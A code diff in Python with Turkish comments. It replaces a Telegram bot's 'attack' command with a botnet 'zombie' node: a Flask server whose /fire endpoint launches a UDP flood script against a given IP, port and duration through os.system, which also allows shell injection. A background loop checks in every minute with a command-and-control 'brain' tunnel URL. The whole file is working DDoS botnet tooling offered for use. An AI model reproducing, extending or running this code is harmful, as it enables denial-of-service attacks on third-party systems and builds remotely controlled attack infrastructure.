@@ -1,27 +1,31 @@
-import requests
+import os, requests, threading, time
+from flask import Flask, request
 
-@bot.message_handler(commands=['edge'])
-def edge_attack(message):
-    if message.from_user.id == ADMIN_ID:
+# AYARLAR - Tünel adresin
+BEYIN_URL = "https://66e882b4d1e011.lhr.life"
+
+app = Flask(__name__)
+
+@app.route('/fire')
+def fire():
+    target = request.args.get('ip')
+    port = request.args.get('port')
+    sure = request.args.get('time')
+    # UDP scriptini tetikler - Gücü 3 olarak ayarladın kanka
+    os.system(f"nohup python3 udp.py {target} {port} 3 {sure} > /dev/null 2>&1 &")
+    return "Ateslendi", 200
+
+def register():
+    while True: # Sonsuz döngü: Zombi her zaman beyne bağlı kalır
         try:
-            args = message.text.split()
-            if len(args) < 4:
-                bot.reply_to(message, "❌ Kullanım: /edge <ip> <port> <süre>")
-                return
-            
-            ip, port, sure = args[1], args[2], args[3]
-            
-            # YENİ LİNKİN BURASI KANKA
-            vercel_url = f"https://ordu-eta.vercel.app/?ip={ip}&port={port}&time={sure}"
-            
-            # Vercel'e tetik gönderiyoruz
-            response = requests.get(vercel_url, timeout=5)
-            
-            if response.status_code == 200:
-                bot.reply_to(message, f"🌍 **Washington (iad1) Hattı Açıldı!**\n🎯 Hedef: {ip}\n⏱ Süre: {sure} sn\n🚀 Mermiler yola çıktı!")
-            else:
-                bot.reply_to(message, "⚠️ Vercel cevap verdi ama motor teklemiş olabilir.")
-                
-        except Exception as e:
-            # Vercel bazen timeout verir ama saldırı arkada başlar
-            bot.reply_to(message, f"🚀 Saldırı tetiklendi kanka! (Not: {e})")
+            # Beynin /kayit rotasına port bilgisiyle selam çakar
+            requests.get(f"{BEYIN_URL}/kayit?port=8080", timeout=5)
+        except:
+            pass
+        time.sleep(60) # Dakikada bir durum bildirimi
+
+if __name__ == '__main__':
+    # Kayıt işlemini arka planda başlat
+    threading.Thread(target=register, daemon=True).start()
+    # Zombinin kendi kapısını aç (Emirleri buradan alacak)
+    app.run(host='0.0.0.0', port=8080)
